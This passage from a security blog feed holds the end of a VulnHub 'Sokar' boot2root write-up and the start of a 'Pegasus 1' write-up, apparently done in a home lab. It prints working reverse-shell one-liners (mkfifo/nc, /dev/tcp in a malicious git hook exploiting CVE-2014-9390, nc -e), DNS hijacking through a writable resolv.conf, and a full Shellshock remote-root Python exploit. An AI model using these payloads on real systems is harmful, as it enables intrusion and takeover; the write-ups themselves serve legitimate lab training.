0024| 0x7fffffffe758 (&amp;quot;/root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0032| 0x7fffffffe760 (&amp;quot;kar-dev:/root/secret-project /mnt/secret-project/&amp;quot;)
0040| 0x7fffffffe768 (&amp;quot;/root/secret-project /mnt/secret-project/&amp;quot;)
0048| 0x7fffffffe770 (&amp;quot;cret-project /mnt/secret-project/&amp;quot;)
0056| 0x7fffffffe778 (&amp;quot;ject /mnt/secret-project/&amp;quot;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554a38 in main ()
gdb-peda$ x/x $rbx
0x7fffffffe740: 0x2f
gdb-peda$ x/s $rbx
0x7fffffffe740:  &amp;quot;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&amp;quot;
gdb-peda$ x/s $rdx
0x7fffffffe7a0:  &amp;quot;f&amp;lt;:;f+ &#39;f. =i*%&amp;amp;&#39;,i::!sff;&amp;amp;&amp;amp;=\t:&amp;amp;\&amp;quot;(;d-,?sf;&amp;amp;&amp;amp;=f:,*;,=d9;&amp;amp;#,*=if$&#39;=f:,*;,=d9;&amp;amp;#,*=f&amp;quot;
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Right before this call though, there is a instruction to &lt;code&gt;call   0x5555555547a0 &amp;lt;setreuid@plt&amp;gt;&lt;/code&gt; to set the UID to 0. So, this brought me to the conclusion that &lt;code&gt;build&lt;/code&gt; is running &lt;code&gt;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&lt;/code&gt; as &lt;code&gt;root&lt;/code&gt;. But what is so special about this?&lt;/p&gt;

&lt;h3 id=&#34;inspecting-git&#34;&gt;inspecting git&lt;/h3&gt;

&lt;p&gt;I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a &lt;code&gt;git clone&lt;/code&gt; as root? One of my first theories was that if I could get &lt;code&gt;sokar-dev&lt;/code&gt; to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions &lt;code&gt;git&lt;/code&gt; will honor really is the symlink and executable bits :(&lt;/p&gt;

&lt;p&gt;Further enumeration while I was thinking about the possibilities revealed that &lt;code&gt;/mnt/&lt;/code&gt; was actually mounted with the &lt;code&gt;vfat&lt;/code&gt; filesystem!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;mount; cat /etc/fstab&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;mount; cat /etc/fstab&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
/dev/sda1 on / type ext4 (rw)
proc on /proc type proc (rw)
sysfs on /sys type sysfs (rw)
devpts on /dev/pts type devpts (rw,gid=5,mode=620)
tmpfs on /dev/shm type tmpfs (rw)
/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)

#
# /etc/fstab
# Created by anaconda on Wed Nov 12 13:29:15 2014
#
# Accessible filesystems, by reference, are maintained under &#39;/dev/disk&#39;
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
UUID=cdb3ac23-d831-4104-bc76-e3a56314b6e4 /                       ext4    defaults        1 1
tmpfs                   /dev/shm                tmpfs   defaults        0 0
devpts                  /dev/pts                devpts  gid=5,mode=620  0 0
sysfs                   /sys                    sysfs   defaults        0 0
proc                    /proc                   proc    defaults        0 0
/dev/sdb1       /mnt            vfat    defaults,uid=501,gid=502    0 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, &lt;code&gt;/mnt&lt;/code&gt; also specified the uid/gid for files on the mount, so even if I &lt;em&gt;were&lt;/em&gt; able to get a suid shell onto the file system, root will not be the one owning it.&lt;/p&gt;

&lt;p&gt;However. &lt;code&gt;vfat&lt;/code&gt;. Why &lt;code&gt;vfat&lt;/code&gt;&amp;hellip; Of course! &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390&#34;&gt;CVE-2014-9390&lt;/a&gt;. The potential client side code execution bug in older &lt;code&gt;git&lt;/code&gt; versions where a case insensitive filesystem may cause the &lt;code&gt;git&lt;/code&gt; client to read hooks from &lt;code&gt;.Git/hooks&lt;/code&gt; instead of &lt;code&gt;.git/hooks&lt;/code&gt;. And, of course, &lt;code&gt;vfat&lt;/code&gt; is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.&lt;/p&gt;

&lt;p&gt;I checked up on the installed version of &lt;code&gt;git&lt;/code&gt; on Sokar, just to make sure that it is in fact vulnerable:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;git --version&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;git --version&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
git version 2.2.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great. &lt;code&gt;git&lt;/code&gt; version 2.2.1 fixed this bug so we are in luck.&lt;/p&gt;

&lt;h2 id=&#34;rooting-sokar&#34;&gt;rooting sokar&lt;/h2&gt;

&lt;p&gt;All of this information was great to have, but it still had one major problem. How can I clone a repository &lt;strong&gt;I&lt;/strong&gt; own? I made &lt;em&gt;countless&lt;/em&gt; attempts to try fool the environment into resolving &lt;code&gt;sokar-dev&lt;/code&gt; to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &amp;lsquo;cleans up&amp;rsquo; the environment, especially for reasons such as this one.&lt;/p&gt;

&lt;p&gt;I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;find /etc/ -writable -type f 2&amp;gt;/dev/null | xargs ls -lh&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;find /etc/ -writable -type f 2&amp;gt;/dev/null | xargs ls -lh&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
-rw-rw-rw- 1 root root 19 Jan  2 20:12 /etc/resolv.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;/etc/resolv.conf&lt;/code&gt; is &lt;strong&gt;world writable&lt;/strong&gt;. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D&lt;/p&gt;

&lt;h3 id=&#34;preparing-the-environment-and-exploit&#34;&gt;preparing the environment and exploit&lt;/h3&gt;

&lt;p&gt;I decided to use &lt;code&gt;dnsmasq&lt;/code&gt; for a quick to setup DNS server. I added a line to &lt;code&gt;/etc/dnsmasq.hosts&lt;/code&gt; to answer a query for &lt;code&gt;sokar-dev&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
192.168.217.174 sokar-dev
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and started the &lt;code&gt;dnsmasq&lt;/code&gt; server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ dnsmasq --no-daemon --log-queries -H /etc/dnsmasq.hosts

dnsmasq: started, version 2.62 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.252.2#53
dnsmasq: read /etc/hosts - 6 addresses
dnsmasq: read /etc/dnsmasq.hosts - 1 addresses
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Testing my DNS server proved that it was working just fine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ dig sokar-dev @127.0.0.1

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.4-rpz2+rl005.12-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; sokar-dev @127.0.0.1
;; global options: +cmd
;; Got answer:
;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 48044
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;sokar-dev.         IN  A

;; ANSWER SECTION:
sokar-dev.      0   IN  A   192.168.217.174

;; Query time: 13 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Feb  3 12:12:02 2015
;; MSG SIZE  rcvd: 43
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome. The next step was to replace the contents of Sokar&amp;rsquo;s &lt;code&gt;/etc/resolv.conf&lt;/code&gt; so that the dns server to use is &lt;em&gt;192.168.217.174&lt;/em&gt; with the command &lt;code&gt;python apophis.py &amp;quot;echo \&amp;quot;nameserver\ 192.168.217.174\&amp;quot; &amp;gt; /etc/resolv.conf&amp;quot;&lt;/code&gt; and confirm that it worked:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;cat /etc/resolv.conf&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;cat /etc/resolv.conf&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
nameserver 192.168.217.174
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great. Testing time!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;echo Y | /home/apophis/build&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
Cloning into &#39;/mnt/secret-project&#39;...
Host key verification failed.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yesssssss, and nooooooooo. From the &lt;code&gt;dnsmasq&lt;/code&gt; console output I could see the request for &lt;code&gt;sokar-dev&lt;/code&gt; coming in and a reply getting sent:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dnsmasq: query[A] sokar-dev from 192.168.217.163
dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type &amp;lsquo;yes&amp;rsquo;. I can not use &lt;code&gt;ssh-keyscan &amp;gt;&amp;gt; ~/.ssh/known_hosts&lt;/code&gt; as I can&amp;rsquo;t write to &lt;code&gt;root&lt;/code&gt;&amp;rsquo;s &lt;code&gt;.ssh&lt;/code&gt; directory, nor can I modify the command that is being passed onto &lt;code&gt;system()&lt;/code&gt; in the binary to specify &lt;code&gt;-o StrictHostKeyChecking=no&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Unfortunately, due to these restrictions, I had to finally give in and go one step back to &lt;code&gt;bynarr.py&lt;/code&gt; and use his allowed egress access on &lt;code&gt;tcp/51242&lt;/code&gt; to build a interactive shell. On one session I started a netcat listener, and on another, I ran &lt;code&gt;python bynarr.py &amp;quot;/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.217.174 51242 &amp;gt;/tmp/f&amp;quot;&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ nc -lvp 51242
listening on [any] 51242 ...
192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.217.174] from (UNKNOWN) [192.168.217.163] 40382
sh: no job control in this shell
sh-4.1$ python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
[bynarr@sokar cgi-bin]$ su - apophis
su - apophis
Password: overdrive

[apophis@sokar ~]$ id
id
uid=501(apophis) gid=502(apophis) groups=502(apophis)
[apophis@sokar ~]$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the interactive shell as &lt;code&gt;apophis&lt;/code&gt; now, I was able to accept the SSH hostkey check.&lt;/p&gt;

&lt;p&gt;The next thing left on the list was to prepare a &lt;code&gt;git&lt;/code&gt; repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for &lt;code&gt;/root/secret-project&lt;/code&gt;, I prepared just that on my Kali VM:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ cd /root
leonjza@kali/root $ mkdir secret-project
leonjza@kali/root $ cd secret-project
leonjza@kali/root/secret-project $ git init --bare
Initialized empty Git repository in /root/secret-project/
leonjza@kali/root/secret-project | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats it&amp;hellip; Next, I cloned it locally in a different folder.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
Cloning into &#39;secret-project&#39;...
root@127.0.0.1&#39;s password:
warning: You appear to have cloned an empty repository.
leonjza@kali/sokar $ cd secret-project
leonjza@kali/sokar/secret-project | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Done. Working from a PoC exploit found &lt;a href=&#34;https://gitlab.com/mehmet/cve-2014-9390&#34;&gt;here&lt;/a&gt;, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM&amp;rsquo;s) on a &lt;code&gt;tcp/22&lt;/code&gt; netcat listener, spawning a shell. I knew &lt;code&gt;tcp/22&lt;/code&gt; traffic was allowed due to the SSH host key verification step that needed some work :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar/secret-project | git:master $ mkdir .Git
leonjza@kali/sokar/secret-project | git:master $ cd .Git
leonjza@kali/sokar/secret-project/.Git | git:master $ mkdir hooks
leonjza@kali/sokar/secret-project/.Git | git:master $ cd hooks
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ vim post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ cat post-checkout
#!/bin/sh
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.217.1/22 0&amp;gt;&amp;amp;1
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ chmod +x ./post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git add -A
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m &#39;pwnd&#39;
[master (root-commit) ee364fd] pwnd
 Committer: root &amp;lt;root@localhost.localdomain&amp;gt;

 1 file changed, 2 insertions(+)
 create mode 100755 .Git/hooks/post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git push -u origin master
root@127.0.0.1&#39;s password:
Counting objects: 5, done.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (5/5), 345 bytes, done.
Total 5 (delta 0), reused 0 (delta 0)
To ssh://127.0.0.1/root/secret-project
 * [new branch]      master -&amp;gt; master
Branch master set up to track remote branch master from origin.
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With my evil repository ready, it was time to try that &lt;code&gt;build&lt;/code&gt; again :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[apophis@sokar ~]$ ./build
./build
Build? (Y/N) Y
Y
Cloning into &#39;/mnt/secret-project&#39;...
root@sokar-dev&#39;s password: # redact lol

remote: Counting objects: 5, done.
remote: Compressing objects: 100% (2/2), done.
Receiving objects: 100% (5/5), done.
remote: Total 5 (delta 0), reused 0 (delta 0)
Checking connectivity... done.

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This shell just &amp;lsquo;hung&amp;rsquo; there, however, the netcat listener on my Mac had a different story to tell:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;leonjza@laptop » sudo nc -lv 22
Password:
[root@sokar secret-project]# cat /root/flag
cat /root/flag
                0   0
                |   |
            ____|___|____
         0  |~ ~ ~ ~ ~ ~|   0
         |  |   Happy   |   |
      ___|__|___________|___|__
      |/\/\/\/\/\/\/\/\/\/\/\/|
  0   |    B i r t h d a y    |   0
  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
 _|___|_______________________|___|__
|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
|                                   |
|     V  u  l  n  H  u  b   ! !     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|___________________________________|

=====================================
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |
|    rasta_mouse (@_RastaMouse)     |
=====================================
[root@sokar secret-project]#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;What a blast! Them feels of r00t are so &lt;em&gt;gooood&lt;/em&gt;. For the curios, that firewall that was making life so difficult:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@sokar secret-project]# cat /etc/sysconfig/iptables
cat /etc/sysconfig/iptables
# Firewall configuration written by system-config-firewall
# Manual customization of this file is not recommended.
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p icmp -j DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state ESTABLISHED -p tcp --sport 22 -j ACCEPT
-A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport 591 -j ACCEPT
-A INPUT -p udp --sport 53 -j ACCEPT
-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --uid-owner 0 -p tcp --dport 22 -j ACCEPT
-A OUTPUT -p udp --dport 53 -m owner --uid-owner 0 -j ACCEPT
-A OUTPUT -m state --state ESTABLISHED -p tcp --sport 591 -j ACCEPT
-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner 501 -p tcp --dport 51242 -j ACCEPT
-A OUTPUT -j DROP
COMMIT
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;edit&#34;&gt;edit&lt;/h2&gt;

&lt;p&gt;I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the &lt;code&gt;lime&lt;/code&gt; script run with &lt;code&gt;sudo&lt;/code&gt; can be shocked too!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# 2015 Leon Jacobs
# sokar remote root command execution

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

# Grab the command from the args
command = sys.argv[1].strip()

# prep to shock the lime script
root_command = &amp;quot;&amp;quot;&amp;quot;echo &amp;quot;N&amp;quot; | sudo MAIL=\\&amp;quot;() { :;}; %s;\\&amp;quot; /home/bynarr/lime&amp;quot;&amp;quot;&amp;quot; % command

# prep to exec the command as bynarr
payload = &amp;quot;&amp;quot;&amp;quot;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;%s&#39;, &#39;bynarr&#39;]);&amp;quot; &amp;quot;&amp;quot;&amp;quot; % root_command

# be verbose about the full command
print &amp;quot; * Executing %s\n&amp;quot; % payload

# Send the sploit
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % payload }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run with &lt;code&gt;python root.py &amp;quot;/bin/cat /root/flag&amp;quot;&lt;/code&gt; :D&lt;/p&gt;

&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; for the VM, and as always, &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting and great community!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>hoof to root solving pegasus 1</title>
      <link>https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/</link>
      <pubDate>Tue, 23 Dec 2014 08:29:49 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/pegasus-1,109/&#34;&gt;Pegasus 1&lt;/a&gt; is a boot2root hosted on &lt;a href=&#34;https://www.vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; built by &lt;a href=&#34;https://twitter.com/theknapsy&#34;&gt;@TheKnapsy&lt;/a&gt;. He wrote a &lt;a href=&#34;http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/&#34;&gt;blogpost&lt;/a&gt; about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Having recently played in the &lt;a href=&#34;https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/&#34;&gt;Offsec Playground&lt;/a&gt; a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&amp;hellip; &lt;em&gt;again&lt;/em&gt;. You will see this in the &lt;strong&gt;my_first&lt;/strong&gt; section.&lt;/p&gt;

&lt;p&gt;Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!&lt;/p&gt;

&lt;p&gt;Lets begin.&lt;/p&gt;

&lt;h2 id=&#34;nmap-again&#34;&gt;nmap, again&lt;/h2&gt;

&lt;p&gt;Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&amp;hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap --reason -sV 192.168.56.101 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 09:16 SAST
Nmap scan report for 192.168.56.101
Host is up, received arp-response (0.00022s latency).
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
8088/tcp  open  http    syn-ack nginx 1.1.19
55625/tcp open  status  syn-ack 1 (RPC #100024)
MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;tcp/22&lt;/code&gt;, &lt;code&gt;tcp/111&lt;/code&gt;, &lt;code&gt;tcp/8088&lt;/code&gt; and &lt;code&gt;tcp/55625&lt;/code&gt;. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on &lt;code&gt;tcp/8088&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;stomping-some-hoofs-with-pegasus&#34;&gt;stomping some hoofs with pegasus&lt;/h2&gt;

&lt;p&gt;Browsing to &lt;a href=&#34;http://192.168.56.101:8088/&#34;&gt;http://192.168.56.101:8088/&lt;/a&gt;, we are presented with a picture of Pegasus:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_web.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I manually tried to browse to things like &lt;code&gt;robots.txt&lt;/code&gt; etc, but everything responded with the same image. This was until I decided to browse to &lt;code&gt;index.php&lt;/code&gt;, in an attempt to check that the web server is configured to serve PHP content:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_nginx_index.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, &lt;code&gt;.php&lt;/code&gt; scripts would 404 correctly. With that in mind, it was time to reach for &lt;code&gt;wfuzz&lt;/code&gt; to discover some more.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.101:8088/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.101:8088/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
==================================================================
ID  Response   Lines      Word         Chars          Request
==================================================================

01426:  C=200      0 L         4 W       19 Ch    &amp;quot; - submit&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And we have a HTTP 200 response for &lt;code&gt;submit.php&lt;/code&gt;. So, I browsed to &lt;a href=&#34;http://192.168.56.101:8088/submit.php:&#34;&gt;http://192.168.56.101:8088/submit.php:&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_submit.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well that isn&amp;rsquo;t exactly useful. I played a little with the &lt;code&gt;submit.php&lt;/code&gt; by sending a POST with some &lt;code&gt;--data&lt;/code&gt;, but nothing useful came of it. Almost everything came back with &lt;code&gt;No data to process&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Admittedly, this was my first hurdle. I was thinking if there is a &lt;code&gt;submit.php&lt;/code&gt;, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&amp;rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. &lt;code&gt;wfuzz&lt;/code&gt; was working with &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;, when finally I get a HTTP 200 for &lt;code&gt;codereview.php&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_code_review.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;pwning-mike&#34;&gt;pwning mike&lt;/h2&gt;

&lt;p&gt;So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data &lt;code&gt;code&lt;/code&gt; to the previously found &lt;code&gt;submit.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.&lt;/p&gt;

&lt;p&gt;PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute &lt;code&gt;/bin/nc 192.168.56.102 4444 -e /bin/sh&lt;/code&gt; or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.&lt;/p&gt;

&lt;p&gt;Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to &lt;code&gt;system()&lt;/code&gt; in it:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_code_review_security.png&#34; /&gt;
    
    
&lt;/figure&gt;


